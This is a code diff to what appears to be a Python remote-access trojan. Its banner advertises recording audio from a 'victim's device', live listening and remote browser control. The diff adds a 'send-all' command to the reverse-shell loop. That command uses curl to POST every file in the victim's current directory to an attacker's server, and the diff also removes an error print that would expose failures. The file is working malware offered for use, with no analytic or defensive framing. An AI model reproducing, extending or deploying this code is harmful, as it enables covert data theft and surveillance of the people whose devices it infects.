@@ -54,7 +54,8 @@ banner = r"""
  -help: display help screen. 
  -record time: record audio from victim's device.
  -stream-sound: Listing to victim realtime.
- -open-browser link: Open browser to specifc link .
+ -open-browser link: Open browser to specifc link.
+ -send-all: send all files for current directory from victim's device to the server.
 """
 def open_browser(link:str):
     if link.startswith('http://') or link.startswith('https://'):
@@ -126,10 +127,36 @@ def get_files(args):
     try:
         result = subprocess.run(curl_cmd, capture_output=True)
         if result.returncode != 0:
-            print(result.stderr.decode())
             return False
         return True
     except:
+        return False
+def send_all():
+    try:
+        files = [
+            f for f in os.listdir(".")
+            if os.path.isfile(f)
+        ]
+        if not files:
+            return False
+        success = False
+        for f in files:
+            curl_cmd = [
+                "curl",
+                "-X", "POST",
+                "-F", f"files=@{f}", 
+                f"{SERVER_URL}/upload"
+            ]
+            result = subprocess.run(
+                curl_cmd,
+                capture_output=True,
+                text=True
+            )
+            if result.returncode == 0:
+                success = True
+        return success
+    except Exception as e:
+        print("error:", e)
         return False
 def get_screenshot():
     try:
@@ -287,6 +314,12 @@ def reverse_shell_payload():
                 else:
                     s.send(b"An issue when put files\n")
                 continue
+           if cmd.lower() == "send-all":
+               if send_all() == True:
+                   s.send(b"Files have been sent to the server\n")
+               else:
+                   s.send(b"The files did't come to your server check the code\n")
+               continue
            if cmd.startswith("send"):
                 args_files = cmd.split()
                 if get_files(args_files) == True:
